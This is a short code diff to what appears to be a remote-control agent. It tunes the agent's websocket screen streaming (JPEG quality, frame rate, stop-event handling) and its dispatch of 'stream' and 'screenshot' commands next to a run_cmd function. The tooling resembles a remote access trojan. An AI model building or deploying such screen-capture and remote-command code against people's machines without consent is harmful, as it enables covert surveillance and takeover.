@@ -40,14 +40,15 @@ def stream_screen(ws):
             screenshot = pyautogui.screenshot()
             frame = np.array(screenshot)
             frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
-            _, buffer = cv2.imencode('.jpg', frame)
+            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
             b64 = base64.b64encode(buffer).decode('utf-8')
             
             send(ws, {"t": "reply", "data": f"[STREAM] {b64}"})
-            time.sleep(0.1) # ~10 FPS
+            time.sleep(0.2) # ~5 FPS to prevent buffer overflow
     except Exception as e:
         pass
     finally:
+        STREAM_EVENT.set()
         send(ws, {"t": "reply", "data": "[-] Stream stopped.\n"})
 
 def run_cmd(ws, cmd):
@@ -155,8 +156,9 @@ def main():
                     if "stopstream" in cmd:
                         STREAM_EVENT.set()
                     elif "stream" in cmd:
-                        STREAM_EVENT.set()
-                        time.sleep(0.2)
+                        if not STREAM_EVENT.is_set():
+                            STREAM_EVENT.set() 
+                            time.sleep(0.2)
                         threading.Thread(target=stream_screen, args=(ws,), daemon=True).start()
                     elif "screenshot" in cmd:
                         do_screenshot(ws)
